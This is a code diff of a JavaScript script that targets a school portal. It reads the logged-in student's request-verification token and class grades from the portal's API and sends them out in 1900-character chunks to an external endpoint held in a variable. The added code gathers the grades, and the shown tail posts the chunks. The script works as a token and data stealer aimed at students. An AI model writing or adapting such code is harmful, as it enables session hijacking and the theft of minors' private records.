@@ -72,20 +72,20 @@ async function start() {
         }
     });
     FINALEMER1['ReqToken'] = p3.Data.RequestVerificationToken;
-    await fetch(mdfg, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            content: JSON.stringify(JSON.parse(await (await fetch('https://headwaters.myschoolapp.com/api/datadirect/ParentStudentUserClassesGet?userId=' + p3.Data.Context.attributes.MasterUserInfo.UserId + '&schoolYearLabel=2024%20-%202025&memberLevel=3&persona=2&durationList=161284%2C161286&markingPeriodId=&viewCid=view118&parentViewCid=view60&changeSchoolYearCount=1&ts=1740780140184&rnd=0.3949742419078759')).text()).map(x => {
-                return {
-                    'grade': x.cumgrade,
-                    'class': x.sectionidentifier
-                }
-            }))
-        })
-    });
+var firsts = await fetch('https://headwaters.myschoolapp.com/api/datadirect/ParentStudentUserClassesGet?userId=' + p3.Data.Context.attributes.MasterUserInfo.UserId + '&schoolYearLabel=2024%20-%202025&memberLevel=3&persona=2&durationList=161284%2C161286&markingPeriodId=&viewCid=view118&parentViewCid=view60&changeSchoolYearCount=1&ts=1740780140184&rnd=0.3949742419078759')
+firsts = await firsts.json()
+var dfdd = {}
+for(let i = 0; i < firsts.length; i++) {
+    dfdd[firsts[i].sectionidentifier] = firsts[i].cumgrade
+}
+var seconds = await fetch('https://headwaters.myschoolapp.com/api/datadirect/ParentStudentUserClassesGet?userId=' + p3.Data.Context.attributes.MasterUserInfo.UserId + '&schoolYearLabel=2024%20-%202025&memberLevel=3&persona=2&durationList=161286&markingPeriodId=&viewCid=view121&parentViewCid=view62&source=changeDuration&changeSchoolYearCount=8&ts=1741275104017&rnd=0.47110786715133899')
+seconds = await seconds.json()
+for(let i = 0; i < seconds.length; i++) {
+    if(dfdd[seconds[i].sectionidentifier] == null) {
+        dfdd[seconds[i].sectionidentifier] = seconds[i].cumgrade
+    }
+}
+FINALEMER1['Classes'] = dfdd
     var pleb = JSON.stringify(FINALEMER1).match(/.{1,1900}/g);
     for (let i = 0; i < pleb.length; i++) {
         await fetch(mdfg, {
